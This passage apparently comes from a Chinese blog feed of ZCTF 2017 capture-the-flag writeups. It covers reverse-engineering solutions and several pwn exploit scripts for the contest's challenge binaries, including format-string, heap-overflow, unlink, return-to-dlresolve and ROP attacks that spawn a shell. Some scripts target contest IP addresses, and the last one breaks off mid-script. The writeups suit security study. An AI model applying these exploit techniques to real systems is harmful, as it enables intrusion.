        table[i],table[v10] = table[v10],table[i]
    v12 = 0 
    v13 = 0 
    s = &apos;&apos;
    for i in range(len(string)):
        v12 = (v12 + 1)%0x100
        v13 = (v13 + table[v12])%0x100
        table[v12],table[v13] = table[v13],table[v12]
        s += chr(ord(string[i]) ^ table[(table[v12]+table[v13])%0x100])
    return s


f = getstr(&apos;C8E4EF0E4DCCA683088134F8635E970EEAD9E277F314869F7EF5198A2AA4&apos;.decode(&apos;hex&apos;))
#print f.encode(&apos;hex&apos;)


m = &apos;easycrack&apos;
n = &apos;&apos;
c = 51

for i in range(len(m)):
    c ^= ord(m[i])
    n += chr(c)

#print n.encode(&apos;hex&apos;)

flag = &apos;&apos;
for i in range(len(f)):
    flag += chr(ord(f[i]) ^ ord(n[i%len(n)]))

print flag
</code></pre>]]></content>
      
        <categories>
            
            <category> matches </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ZCTF writeup总结]]></title>
      <url>/2017/03/16/ZCTF-writeup%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>ZCTF结束，大牛们整理了解题思路，我给整理总结下<br><a id="more"></a></p>
<h3 id="Reverse-QExtend"><a href="#Reverse-QExtend" class="headerlink" title="Reverse-QExtend"></a>Reverse-QExtend</h3><hr>
<p>这个程序有少量混淆，第一个是用call+pop指令使得ida没法正常反编译，第二个是修改了函数的返回地址。<br><img src="http://p1.bqimg.com/567571/c5088f7894443968.png" alt=""></p>
<p>在ida中进行修复到能正常f5.<br><img src="http://p1.bpimg.com/567571/63c0b41268685840.png" alt=""></p>
<p>分析功能，发现是个汉诺塔游戏。</p>
<p>初始状态:<br><img src="http://i1.piimg.com/567571/170e543c372b85c4.png" alt=""></p>
<p>需要达到的状态:<br><img src="http://i1.piimg.com/567571/4e8c343aa81c870e.png" alt=""></p>
<p>各操作码对应的操作：<br><img src="http://p1.bqimg.com/567571/6c4f34ecf75416a4.png" alt=""></p>
<p>手工完了下汉诺塔，得到的最短路径为053254104123104524104操作码为input[i]%16-1，所以爆破了一下input，最终得到的flag为:ZCTF{A&amp;$#&amp;5rA5r#$rA5&amp;#5rA5}</p>
<h3 id="Reverse-EasyReverse"><a href="#Reverse-EasyReverse" class="headerlink" title="Reverse-EasyReverse"></a>Reverse-EasyReverse</h3><hr>
<p><img src="http://p1.bqimg.com/567571/2f7ffdc99b03612b.png" alt=""><br>符号没去掉，encrypt_str函数，逆向完后发现是xtea算法，秘钥为：</p>
<blockquote>
<pre><code>print (chr(222)+chr(173)+chr(190)+chr(239)).encode(&quot;hex&quot;)
deadbeef
</code></pre></blockquote>
<p>处理一下xtea解密即可得到flag，16字节有些许问题，补齐，然后利用python的xtea解密即可：</p>
<blockquote>
<pre><code>from xtea import *
 x = new(k, mode=MODE_ECB)
   print x.decrypt(v5)
</code></pre></blockquote>
<p><img src="http://p1.bpimg.com/567571/52ddaea118877c77.png" alt=""></p>
<h3 id="Reverse-CryptTab"><a href="#Reverse-CryptTab" class="headerlink" title="Reverse-CryptTab"></a>Reverse-CryptTab</h3><hr>
<ol>
<li><p>首先是一个压缩包，有密码，不过在文件的末尾得到了压缩密码，解压得到一个data文件。</p>
</li>
<li><p>看起来像shellcode，就用ida打开分析。发现对0x17开始的0x2200字节进行了0xcc异或操作。异或之后分析发现后面有一个dll，将其提取出来，用ida打开，可以发现导出了一个Encrypt函数。</p>
</li>
<li><p>从程序上看代码异或解密完之后直接跳转到sub_17函数。分析sub_17函数，发现是一个获取kernel32.dll的地址，然后就执行不下去了，坑。</p>
</li>
</ol>
<p>从ida的调用图上猜这儿应该跳转到sub_131。<br><img src="http://p1.bpimg.com/567571/fed2e7102f299ad5.png" alt=""></p>
<ol>
<li>分析sub_131，有发现需要参数ebx，但是ebx赋什么并不知道，坑。</li>
</ol>
<p>后来分析到sub_44，该函数为获取库函数的地址，第一个参数为dll的地址，第二个参数为函数的hash值，第二个参数从[ebx+1]处取得。</p>
<p>因为shellcode一般需要获取LoadLibraryA函数地址，算了一下LoadLibraryA的hash值为0xec0e4e8e，然后在shellcode中搜索这个值，还真找到了。</p>
<blockquote>
<pre><code>string = &apos;LoadLibraryA&apos;
def rol(a):
     return ((a&lt;&lt;0x13) | (a&gt;&gt;(32-0x13)))&amp;0xffffffff
c = 0
for i in range(len(string)):
      c = rol(c) + ord(string[i])
print hex(c)
</code></pre></blockquote>
<p><img src="http://p1.bqimg.com/567571/062ff30db43b4a13.png" alt=""></p>
<p>所以ebx的值应该为0x310。</p>
<p>向下分析，可以看到程序得到了LoadLibrayA、VirtualAlloc和VirtualFree3个函数的地址，然后又执行不下去了，坑。</p>
<ol>
<li>然后就对着函数猜了。</li>
</ol>
<p>应该就是对0x156处的0x10个字节和0x166处的0x30字节作为输入，加密得到的值与0x19a处的0x30字节进行比较。</p>
<p><img src="http://i1.piimg.com/567571/44d4cbe3bc928e7d.png" alt=""></p>
<ol>
<li>后面就是分析Encrypt函数，各种交换移位，我这种算法渣只能想到爆破了。</li>
</ol>
<p>注：以下代码格式有修改，请读者自行调整。<br>int main()<br>{<br>       unsigned char str[0x100] = “\xF3\x23\xB5\xA6\xF5\x6A\xCB\x88\xD2\xC6\xD2\x2F\x32\xB9\xC3\xAA\x32\x9E\xAD\xEE\x8C\x22\x2D\x45\x62\x67\xFB\xD9\x64\x46\xF8\xE7\xC8\x20\x35\x86\xE9\x98\xBF\xD5\x55\xCA\x8B\x85\x67\x76\x19\x9A”;</p>
<pre><code>   printf(&quot;len=%d\n&quot;, strlen((char*)str));
   HMODULE handle = LoadLibraryA(&quot;DLL_Export.dll&quot;);
   ENCRYPT ProcAddr;
   ProcAddr = (ENCRYPT)GetProcAddress(handle, &quot;Encrypt&quot;);
   printf(&quot;%x\n&quot;, ProcAddr);

   unsigned char c1[]= &quot;\x21\x23\x25\x26\x2a&quot;;
   unsigned char c3[]=&quot;\x43\x45\x47\x49\x4b&quot;;
   unsigned char c2[]=&quot;\x35\x36\x37\x38\x39&quot;;

   unsigned char input[17];
   //for(int i0=0;i0&lt;5;i0++)
    int i0 =4;
    printf(&quot;i0=%d\n&quot;, i0);
    {
    for(int i1=0;i1&lt;5;i1++)
    {
    printf(&quot;i1=%d\n&quot;, i1);
    for(int i2=0;i2&lt;5;i2++)
    {
    for(int i3=0;i3&lt;5;i3++)
    {
    printf(&quot;i3=%d\n&quot;, i3);
    for(int i4=0;i4&lt;5;i4++)
    {
    for(int i5=0;i5&lt;5;i5++)
    {
    for(int i6=0;i6&lt;5;i6++)
    {
    for(int i7=0;i7&lt;5;i7++)
    {
    for(int i8=0;i8&lt;5;i8++)
    {
    for(int i9=0;i9&lt;5;i9++)
    {
    for(int i10=0;i10&lt;5;i10++)
    {
    for(int i11=0;i11&lt;5;i11++)
    {
    for(int i12=0;i12&lt;5;i12++)
    {
    for(int i13=0;i13&lt;5;i13++)
    {
    for(int i14=0;i14&lt;5;i14++)
    {
        input[0] = c1[i0];
        input[1] = c2[i1];
        input[2] = c3[i2];
        input[3] = c1[i3];
        input[4] = c2[i4];
        input[5] = c3[i5];
        input[6] = c1[i6];
        input[7] = c2[i7];
        input[8] = c3[i8];
        input[9] = c1[i9];
        input[10] = c2[i10];
        input[11] = c3[i11];
        input[12] = c1[i12];
        input[13] = c2[i13];
        input[14] = c3[i14];
        input[15] =&apos;\x24&apos;;
        input[16]=&apos;\x00&apos;;
        unsigned char data[0x100] = &quot;\x38\x9B\x50\xCE\x86\xDD\xF0\x1D\x0D\xC3\xD6\xE2\xF2\x29\xD3\x83\x6C\xE8\x86\x5F\x95\xE6\x4F\x63\x5F\x3B\x9B\x5F\x53\xBC\x41\x2A\x49\x08\x02\xAA\x10\xEC\x2C\x58\xD5\x27\xCD\x93\x38\x10\xE4\xDC&quot;;
        unsigned char * output;
        __asm          
        {
               push esi
               lea esi, input
               push esi
               lea esi, data;
               call ProcAddr
               mov output, eax
               pop eax
               pop esi
        }
        if(!memcmp(output, str, 0x30))
        {
               printf(&quot;%s\n&quot;, input);
        }
        }
        }
        }
        }
        }
        }
        }
        }
        }
        }
        }
        }
        }
        }
        }
}
</code></pre><p>爆出来为:%6K#7E&amp;5C*9G!8I$<br>当然这还不是最终结果，还要用这个作为密钥，去AES解密加密表，才能得到flag。。。</p>
<h3 id="Pwn-login"><a href="#Pwn-login" class="headerlink" title="Pwn-login"></a>Pwn-login</h3><hr>
<p>sprintf里面的格式化字符串的内容可以被自身的格式化给覆盖掉，把%s:%s覆盖掉，覆盖成%hhn，然后格式化来改写check_stack_fail的最后一字节，拿shell的时候 ，不能用system拿，不能用system拿，环境变量被栈覆盖掉了：</p>
<pre><code>from zio import *

 target = (&quot;58.213.63.30&quot;,4002)

   def get_io(target):
    r_m = COLORED(RAW, &quot;green&quot;)
    w_m = COLORED(RAW, &quot;blue&quot;)
    io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
    return io

   def gen_rop_data(func_addr, args, pie_text_base = 0):
     p_ret = [0x0804844e, 0x08048465, 0x0804891a, 0x08048919, 0x08048918]
     rop_data  = &apos;&apos;
     rop_data += l32(func_addr)
     if len(args) &gt; 0:
         rop_data += l32(p_ret[len(args)] + pie_text_base)
     for arg in args:
         rop_data += l32(arg)
     return rop_data

   def pwn(io):

    puts_got                   = 0x0804a01c          
    offset_puts                = 0x656a0             
    puts_plt                   = 0x080484c0

    read_plt                   = 0x08048480

    read_buff_addr = 0x0804862B

    check_stack_fail_got = 0x804A014

    bss_addr = 0x0804a000 + 0xe20
    leave_ret = 0x08048715
    pop_ebp_ret = 0x0804871f #: pop ebp ; ret

    username = &quot;&quot;
    #username += &apos;bbbb&apos;
    username += l32(check_stack_fail_got)
    username += &quot;a&quot;*0x4C
    #username += &quot;bbbb&quot;
    username += gen_rop_data(puts_plt, [puts_got])
    username += gen_rop_data(read_buff_addr, [bss_addr, 0x01010101])
    username += l32(pop_ebp_ret) + l32(bss_addr)
    username += l32(leave_ret)
    #username += gen_rop_data(puts_plt, [puts_got+4])


    print hex(len(username)), hex(0xd6 - 0x5c - 4)
    #username = username.ljust(0xd6 - 0x5c - 4, &apos;a&apos;)

    #username += &quot;%s:%s.%p.%p.%p.%p.%p&quot;# + &quot;%p.&quot;*4
    #username += &quot;%x.&quot;.ljust(8, &apos;-&apos;)*10
    #username += &quot;aa:&quot;
    username = username.ljust(0xc0, &apos;a&apos;)
    username += &apos;a&apos;*(0x66-0x43)
    username += &quot;%9$hhn.&quot;.ljust(10, &apos;-&apos;)
    #username += &quot;%9$p.&quot;.ljust(10, &apos;-&apos;)

    username = username.ljust(0x100-1, &apos;a&apos;)

    password = &quot;&quot;
    password += &apos;w&apos; * 0x40

    io.read_until(&quot;:&quot;)
    io.writeline(username)
    io.read_until(&quot;:&quot;)

    #io.gdb_hint()
    io.writeline(password)

    io.read_until(&quot;&quot;)
    io.read_until(&quot;Login successful!\n&quot;)

    io.read_until(&quot;\n&quot;)
    data = io.read_until(&quot;\n&quot;)
    print data
    puts_addr = l32(data[:4])

    offset_system = 0x3e800
    offset_execve = 0xB59F0

       #&quot;&quot;&quot;
    #remote
    offset_system = 0x3fe70
    offset_puts                = 0x64da0
    offset_execve = 0xB4EA0
    #&quot;&quot;&quot;

    libc_base = puts_addr - offset_puts
    system_addr = libc_base + offset_system
    execve_addr = libc_base + offset_execve

    payload = &quot;&quot;
    payload += l32(0x0)
    payload += gen_rop_data(execve_addr, [bss_addr+0x100, 0, 0])
    payload = payload.ljust(0x100, &apos;a&apos;)
    payload += &quot;/bin/sh\x00&quot;
    payload += l8(0x1f)

    io.gdb_hint()
    io.writeline(payload)
    io.interact()


     io = get_io(target)
     pwn(io)
</code></pre><h3 id="Pwn-Dragon"><a href="#Pwn-Dragon" class="headerlink" title="Pwn-Dragon"></a>Pwn-Dragon</h3><hr>
<p>存在堆溢出，可以修改堆结构中的size.<br>脚本如下：</p>
<pre><code>from pwn import *

   #r = remote(&apos;58.213.63.30&apos;, 11501) 
   r = process(&quot;./dragon&quot;)

   def add(size, name, content):
     r.recvuntil(&apos;&gt;&gt;&apos;)
     r.sendline(&apos;1&apos;)
     r.recvuntil(&apos;:&apos;)
     r.sendline(str(size))
     r.recvuntil(&apos;:&apos;)
     r.sendline(name)
     r.recvuntil(&apos;:&apos;)
     r.sendline(content)

   def edit(id, content):
     r.recvuntil(&apos;&gt;&gt;&apos;)
     r.sendline(&apos;2&apos;)
          r.recvuntil(&apos;:&apos;)
      r.sendline(str(id))
     r.recvuntil(&apos;:&apos;)
      r.write(content)

   def show(id):
     r.recvuntil(&apos;&gt;&gt;&apos;)
     r.sendline(&apos;4&apos;)
     r.recvuntil(&apos;:&apos;)
      r.sendline(str(id))

   def delete(id):
     r.recvuntil(&apos;&gt;&gt;&apos;)
      r.sendline(&apos;3&apos;)
      r.recvuntil(&apos;:&apos;)
      r.sendline(str(id))


 add(0x20, &apos;AAAA&apos;, &apos;AAAA&apos;)
 add(0x20, &apos;AAAA&apos;, &apos;A&apos;*0x18)
 add(0x20, &apos;AAAA&apos;, &apos;A&apos;*0x18)

 edit(0, &apos;A&apos;*0x18+p64(0xd1)) # note1
   delete(1)
 add(0x20, &apos;AAAA&apos;, &apos;A&apos;*0x18)
 strlen_got = 0x602028
   add(0x10, &apos;AAAA&apos;, p64(strlen_got)+&apos;d&apos;*0x10)
 edit(3, p64(strlen_got)) #note2
   show(2)
 r.recvuntil(&apos;content: &apos;)
 strlen_addr = u64(r.readline()[:-1].ljust(8, &apos;\x00&apos;))
   print &quot;[*] strlen addr:{0}&quot;.format(hex(strlen_addr))
 libc = ELF(&quot;./libc-2.19.so&quot;)#ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
   libc_base = strlen_addr - libc.symbols[&apos;strlen&apos;]
 system_addr = libc_base + libc.symbols[&apos;system&apos;] 
 edit(2, p64(system_addr))

 edit(0, &apos;/bin/sh\x00&apos;)
 r.interactive()
</code></pre><h3 id="Pwn-Class"><a href="#Pwn-Class" class="headerlink" title="Pwn-Class"></a>Pwn-Class</h3><hr>
<p>在init函数中num*200+8存在整形溢出，num控制得当可以使得分配的空间很小。Setjmp会将当前的寄存器保存到堆上（部分寄存器进行了rol和异或加密）。通过show功能可以泄露出保存的寄存器值，通过edit功能可以修改这些值，然后通过longjmp改变程序的控制流程，因为rsp和rip都能被随意修改，所以比较容易进行rop。</p>
<p>脚本：</p>
<pre><code>from threading import Thread
from zio import *
target = &apos;./class&apos;
target = (&apos;58.213.63.30&apos;, 4001)

def interact(io):
     def run_recv():
         while True:
             try:
                 output = io.read_until_timeout(timeout=1)
                 # print output
             except:
                 return

     t1 = Thread(target=run_recv)
     t1.start()
     while True:
         d = raw_input()
         if d != &apos;&apos;:
             io.writeline(d)

def rerol(d):
     return ((d&lt;&lt;(64-0x11))+(d&gt;&gt;0x11))&amp;0xffffffffffffffff

def rol(d):
        return ((d&lt;&lt;0x11) + (d&gt;&gt;(64-0x11)))&amp;0xffffffffffffffff

def show(io, id):
        io.read_until(&apos;&gt;&gt;&apos;)
     io.writeline(&apos;2&apos;)
     io.read_until(&apos;:&apos;)
        io.writeline(str(id))

        io.read_until(&apos;name:&apos;)
     r12 = l64(io.read_until(&apos;,&apos;)[:-1].ljust(8, &apos;\x00&apos;))
     print &apos;r12&apos;, hex(r12)
     io.read_until(&apos;addr:&apos;)
     enc_rsp = l64(io.read(8))
     enc_rip = l64(io.read_until(&apos;,&apos;)[:-1].ljust(8, &apos;\x00&apos;))

     base = r12 - 0xaa0
      print &apos;enc_rsp&apos;, hex(enc_rsp)
     print &apos;enc_rip&apos;, hex(enc_rip)

     real_rip = base + 0x1495
     cookie = rerol(enc_rip)^real_rip

     print &apos;cookie&apos;, hex(cookie)

      real_rsp = rerol(enc_rsp)^cookie
     print &apos;real_rsp&apos;, hex(real_rsp)

     return (base, real_rsp, cookie)

def edit(io, id, age, name, addr, introduce):
         io.read_until(&apos;&gt;&gt;&apos;)
         io.writeline(&apos;3&apos;)
         io.read_until(&apos;:&apos;)
         io.writeline(str(id))
         io.read_until(&apos;:&apos;)
         io.writeline(name)
         io.read_until(&apos;:&apos;)
          io.writeline(str(age))
        io.read_until(&apos;:&apos;)
        io.writeline(addr)
         io.read_until(&apos;:&apos;)
         io.writeline(introduce)


def exp(target):
     io = zio(target, timeout=10000, print_read=COLORED(RAW, &apos;red&apos;), \
     print_write=COLORED(RAW, &apos;green&apos;))

     io.read_until(&apos;:&apos;)
     io.writeline(str(92233720368547759))
     base, rsp, cookie = show(io, 1)
     print &apos;base&apos;, hex(base)

     fake_rsp = rsp - 0x48
     pop_rdi_ret = base + 0x000000000001523

     addr = l64(rol(fake_rsp^cookie))+l64(rol(pop_rdi_ret^cookie))
     print HEX(addr)
     edit(io, 1, 0, &quot;&quot;, addr, &quot;&quot;)

     io.read_until(&apos;&gt;&gt;&apos;)
     payload = &apos;5;&apos;+&apos;a&apos;*6

     puts_got = 0x0000000000202018+ base
     puts_plt = 0x9a0 + base
     main = base + 0x00000000000013ff
     payload += l64(puts_got)+l64(puts_plt)+l64(main)
     io.writeline(payload)

     puts_addr = l64(io.readline()[:-1].ljust(8, &apos;\x00&apos;))
     &apos;&apos;&apos;
     base = puts_addr - 0x000000000006F5D0

     system = base + 0x0000000000045380

     print &apos;system&apos;, hex(system)
     binsh = base + 0x000000000018C58B
     &apos;&apos;&apos;

     base = puts_addr - 0x000000000006FD60
     print &apos;base&apos;, hex(base)
     system = base + 0x0000000000046590
     binsh = base + 0x000000000017C8C3

     #io.gdb_hint()
     io.read_until(&apos;:&apos;)
     io.writeline(str(92233720368547759))


     fake_rsp = rsp - 0x80

     addr = l64(rol(fake_rsp^cookie))+l64(rol(pop_rdi_ret^cookie))
     print HEX(addr)
     io.gdb_hint()
     edit(io, 1, 0, &quot;&quot;, addr, &quot;&quot;)

     io.read_until(&apos;&gt;&gt;&apos;)
     payload = &apos;5;&apos;+&apos;a&apos;*6

     payload += l64(binsh)+l64(system)+l64(main)
     io.writeline(payload)

     #io.gdb_hint()
     interact(io)

     exp(target)
</code></pre><h3 id="Pwn-sandbox"><a href="#Pwn-sandbox" class="headerlink" title="Pwn-sandbox"></a>Pwn-sandbox</h3><hr>
<p>沙箱做了如下限制：对外的调用都通过jmp ds:dl_resolve出去，所以采用return-to-dlresolve进行利用。</p>
<p>脚本：</p>
<pre><code>#encoding:utf-8
import struct
from threading import Thread
from zio import *


target = &apos;./sandbox ./vul&apos;
#target = &apos;./vul&apos;
target = (&apos;58.213.63.30&apos;, 4004)

def interact(io):
    def run_recv():
           while True:
            try:
                output = io.read_until_timeout(timeout=1)
                # print output
            except:
                return

    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != &apos;&apos;:
            io.writeline(d)

def write_16byte(io, addr, value):
    io.write(&apos;a&apos;*0x10+l64(addr+0x10)+l64(0x400582))
    io.write(value+l64(0x601f00)+l64(0x400582))

fake_relro = &apos;&apos;
fake_sym = &apos;&apos;

#link_map_addr = 0x00007ffff7ffe1c8 #close aslr.(if has aslr, need leak)

#link_map_addr = 0x7ffff7ffe168
def generate_fake_relro(r_offset, r_sym):
    return l64(r_offset) + l32(7)+l32(r_sym)+ l64(0)

def generate_fake_sym(st_name):
    return l32(st_name)+l8(0x12)+l8(0) + l16(0) + l64(0) + l64(0)


#versym = 0x40031e
symtab = 0x4002b8
strtab = 0x400330
jmprel = 0x4003b8

bss_addr = 0x601058

# .bss addr = 0x601058
# 0x155dc*0x18+0x4003b8 = 0x601058
# so index = 0x155dc

#0x155e8*0x18+0x4002b8 = 0x601078
# so r_sym = 0x155e8

# 0x200d68 + 0x400330 = 0x601098
# so st_name = 0x200d68


def write_any(io, addr, value):
    print hex(addr), hex(value)
    io.read_until(&apos;:\n&apos;)
    io.writeline(&apos;0&apos;)
    io.write(l64(addr)+l64(value))

def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, &apos;red&apos;), print_write=COLORED(RAW, &apos;green&apos;))
    pop_rdi_ret = 0x0000000000400603
    pop_rsi_r15_ret = 0x0000000000400601
    leak_addr = 0x600ef0
    write_plt = 0x0000000000400430
    pop_rbp_ret = 0x4004d0
    leak_rop = l64(pop_rsi_r15_ret) + l64(leak_addr) + l64(0) + l64(pop_rdi_ret) + l64(1) + l64(write_plt)
    leak_rop += l64(pop_rbp_ret) + l64(0x601f00) + l64(0x400582)

    for i in range(0, len(leak_rop), 8):
        write_16byte(io, 0x601b00+i, leak_rop[i:i+8]+&apos;\x00&apos;*8)

    leave_ret = 0x40059d
    leak_stack_povit = &apos;a&apos; * 0x10 + l64(0x601b00 - 0x8) + l64(leave_ret)
    io.write(leak_stack_povit)

    io.read_until(&apos;:&apos;)
    link_map_addr = l64(io.read(8)) + 0x28
    print hex(link_map_addr)

    r_offset = 0x601970 # a writable addr
    r_sym = 0x155e8

    fake_relro = generate_fake_relro(r_offset, r_sym).ljust(0x20, &apos;\x00&apos;)

    st_name = 0x200d68
    fake_sym = generate_fake_sym(st_name).ljust(0x20, &apos;\x00&apos;)

    write_16byte(io, link_map_addr+0x1c8, &apos;\x00&apos;*0x10)
    #write_16byte(io, 0x600858, l64(0x6ffffff0)+l64(0x3d57d6))

    for i in range(0, len(fake_relro), 8):
        write_16byte(io, 0x601058+i, fake_relro[i:i+8]+&apos;\x00&apos;*8)
    for i in range(0, len(fake_sym), 8):
        write_16byte(io, 0x601078+i, fake_sym[i:i+8]+&apos;\x00&apos;*8)

    write_16byte(io, 0x601098, &apos;system&apos;.ljust(16, &apos;\x00&apos;))
    write_16byte(io, 0x601a50, &apos;/bin/sh&apos;.ljust(16, &apos;\x00&apos;))

    plt0 = 0x400420

    rop = l64(pop_rdi_ret) + l64(0x601a50)
    index = 0x155dc
    rop += l64(plt0) + l64(index)

    for i in range(0, len(rop), 8):
        write_16byte(io, 0x601980+i, rop[i:i+8]+&apos;\x00&apos;*8)

    stack_povit = &apos;a&apos;*0x10 + l64(0x601980-0x8) + l64(leave_ret)
    io.write(stack_povit)

    interact(io)

exp(target)
</code></pre><h3 id="Pwn-note"><a href="#Pwn-note" class="headerlink" title="Pwn-note"></a>Pwn-note</h3><hr>
<p>漏洞存在于edit中，有堆溢出。</p>
<p>此题采用talloc，不过talloc_free内部会调用free函数，所以采用unlink方法进行利用。</p>
<p>脚本：</p>
<pre><code>from threading import Thread
from zio import *

target = (&apos;119.254.101.197&apos;, 10000)
target = &apos;./note&apos;


def interact(io):
    def run_recv():
        while True:
            try:
                output = io.read_until_timeout(timeout=1)
            except:
                return

    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != &apos;&apos;:
            io.writeline(d)

def add(io, title, size, content):
    io.read_until(&apos;&gt;&gt;&apos;)
    io.writeline(&apos;1&apos;)
    io.read_until(&apos;:&apos;)
    io.writeline(title)
    io.read_until(&apos;:&apos;)
    io.writeline(str(size))
    io.read_until(&apos;:&apos;)
    io.writeline(content)

def edit(io, id, offset, content):
    io.read_until(&apos;&gt;&gt;&apos;)
    io.writeline(&apos;3&apos;)
    io.read_until(&apos;:&apos;)
    io.writeline(str(id))
    io.read_until(&apos;:&apos;)
    io.writeline(str(offset))
    io.read_until(&quot;:&quot;)
    io.writeline(content)

def edit2(io, id, offset, content):
    count = len(content)/48
    print len(content)
    print count
    for i in range(count):
        io.read_until(&apos;&gt;&gt;&apos;)
        io.writeline(&apos;3&apos;)
        io.read_until(&apos;:&apos;)
        io.writeline(str(id))
        io.read_until(&apos;:&apos;)
        io.writeline(str(offset+48*i))
        io.read_until(&quot;:&quot;)
        io.write(content[i*48:i*48+48])
    if len(content[count*48:]) &gt; 0:
        io.read_until(&apos;&gt;&gt;&apos;)
        io.writeline(&apos;3&apos;)
        io.read_until(&apos;:&apos;)
        io.writeline(str(id))
        io.read_until(&apos;:&apos;)
        io.writeline(str(offset+48*count))
        io.read_until(&apos;:&apos;)
        io.writeline(content[count*48:])

def delete(io, id):
    io.read_until(&apos;&gt;&gt;&apos;)
    io.writeline(&apos;4&apos;)
    io.read_until(&apos;:&apos;)
    io.writeline(str(id))

def change(io, id, title):
    io.read_until(&apos;&gt;&gt;&apos;)
    io.writeline(&apos;5&apos;)
    io.read_until(&apos;:&apos;)
    io.writeline(str(id))
    io.read_until(&apos;:&apos;)
    io.writeline(title)

def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, &apos;red&apos;), \
             print_write=COLORED(RAW, &apos;green&apos;))
    add(io, &apos;%13$p&apos;, 0x100, &apos;111&apos;) #0x603070 0x603110   #0
    add(io, &apos;222&apos;, 0x100, &apos;222&apos;) #0x603280 0x603320   #1
    add(io, &apos;333&apos;, 0x100, &apos;333&apos;) #0x603490 0x603530   #2
    add(io, &apos;444&apos;, 0x100, &apos;444&apos;) #0x6036a0 0x603740   #3
    add(io, &apos;sh;&apos;, 0x100, &apos;555&apos;) #0x6038b0 0x603950   #4
    add(io, &apos;666&apos;, 0x100, &apos;666&apos;) #0x603ac0 0x603b60   #5

    delete(io, 1)
    delete(io, 2)

    heap_ptr = 0x6020f0
    payload = l64(0) + l64(0x211) +l64(heap_ptr-0x18)+l64(heap_ptr-0x10)
    payload = payload[:-1]

    add(io, payload[:-1], 0x300, &apos;777&apos;) #0x603280 0x603320   #6
    add(io, &apos;sh;&apos;, 0x100, &apos;888&apos;)

    #io.gdb_hint()

    offset = 0x603490 - 0x603320
    #                      size        next    prev     parent
    fake_head1 = l64(0x210)+l64(0x90)+ l64(0) +l64(0)+ l64(0x603a60)
                # child   refs  descutor   name      size       flags                   pool   padding
    fake_head2 = l64(0)+l64(0)+l64(0)+l64(0x400dc4)+l64(0x100)+l64(0x00000000e8150c70)+l64(0)+l64(0)+l64(0)
    fake_head2 = fake_head2.ljust(0x90-0x28, &apos;\x00&apos;)
    fake_head2 += l64(0) + l64(0x21) + &apos;\x00&apos;*0x10 + l64(0) + l64(0x21)

    fake_head1 = fake_head1[:-6]
    payload = &apos;\x00&apos; + l64(0)+l64(0xa1)+l64(0)+l64(0)+l64(0)+l64(0x6034a0)
    payload = payload[:-6]
    edit(io, 4, 0x100-1, payload)
    edit2(io, 6, offset, fake_head1)
    edit2(io, 6, offset+0x28, fake_head2)

    delete(io, 5)

    talloc_free_got = 0x602048
    print_plt = 0x4007E0

    title = l64(talloc_free_got) + l64(0) + l64(0) + l64(0x6020d0)
    title = title[:-2]
    change(io, 6, title)

    change(io, 3, l64(print_plt)[:-1])

    io.gdb_hint()
    delete(io, 0)

    io.read_until(&apos;0x&apos;)
    main_ret = int(io.read_until(&apos;De&apos;)[:-2], 16)
    base = main_ret - 0x0000000000021EC5
    print hex(base)
    system = base + 0x0000000000046640
    print hex(system)

    change(io, 3, l64(system)[:-1])

    delete(io, 7)

    interact(io)

exp(target)
</code></pre><h3 id="Pwn-Goodluck"><a href="#Pwn-Goodluck" class="headerlink" title="Pwn-Goodluck"></a>Pwn-Goodluck</h3><hr>
<p>条件竞争漏洞，g_index的值可以在主线程中修改，然后在第2个子线程中能实现任意地址+1操作。</p>
<p>read_int如果参数为0，可以栈溢出。</p>
<p>脚本：</p>
<pre><code>from threading import Thread
# from uploadflag import *
from zio import *

target = (&apos;119.254.101.197&apos;, 10000)
target = &apos;./pwn2&apos;


def add1(io,type,name,number,some):
      io.read_until(&quot;choice:&quot;)
      io.writeline(&apos;1&apos;)
      io.read_until(&quot;flower&quot;)
      io.writeline(str(type))
      io.read_until(&apos;name:&apos;)
      io.writeline(name)
      io.read_until(&apos;number:&apos;)
      io.writeline(str(number))
      io.read_until(&apos;again:&apos;)
      io.writeline(some)

def add2(io, type, name, much, price,   some):
      io.read_until(&quot;choice:&quot;)
      io.writeline(&apos;1&apos;)
      io.read_until(&quot;flower&quot;)
      io.writeline(str(type))
      io.read_until(&apos;name:&apos;)
      io.writeline(name)
      io.read_until(&apos;want:&apos;)
      io.writeline(much)
      io.read_until(&apos;table:&apos;)
      io.writeline(price)
      io.read_until(&apos;something:&apos;)
      io.writeline(some)

def show(io,index):
      io.writeline(&apos;4&apos;)
      io.read_until(&apos;show&apos;)
      io.writeline(str(index))

def delete(io,index):
      io.writeline(&apos;2&apos;)
      io.read_until(cs7)
      io.writeline(str(index))

def edit(io,index,data):
      io.writeline(&apos;3&apos;)
      io.read_until(&apos;edit:&apos;)
      io.writeline(str(index))
      io.read_until(&apos;something&apos;)
      io.writeline(data)

def interact(io):
      def run_recv():
          while True:
            try:
                output =   io.read_until_timeout(timeout=1)
                # print output
            except:
                return

      t1 = Thread(target=run_recv)
      t1.start()
      while True:
          d = raw_input()
          if d != &apos;&apos;:
            io.writeline(d)


def exp(target):
      io = zio(target, timeout=10000, print_read=COLORED(RAW, &apos;red&apos;), \
             print_write=COLORED(RAW,   &apos;green&apos;))

      add1(io, 3, &apos;bbbb&apos;, 100, &apos;ccccccccc&apos;)
      fake_index = (0x2031a0 - 0x203180)/8
      delete(io, 0)
      delete(io, fake_index)
      io.read_until(&apos;delete 0&apos;)
      show(io, 0)
      io.read_until(&apos;s1-&gt;&apos;)
      data = io.read_until(&apos; &apos;)[:-1]
      code_base = l64(data.ljust(8, &apos;\x00&apos;)) - 0x1040
      print hex(code_base)

      canary_addr = code_base + 0x2031c0 + 1
      add2(io, 2, &apos;aaaa&apos;, str(canary_addr&amp;0xffffffff),   str(canary_addr&gt;&gt;32), &apos;bbbbbbbb&apos;)

      delete(io, 1)
      delete(io, fake_index + 1)
      io.read_until(&apos;delete 1&apos;)
      show(io, 1)
      io.read_until(&quot;fake show!\n&quot;)
      cookies = l64(io.read_until(&apos;\n&apos;)[:-1].ljust(8, &apos;\x00&apos;)) &lt;&lt; 8
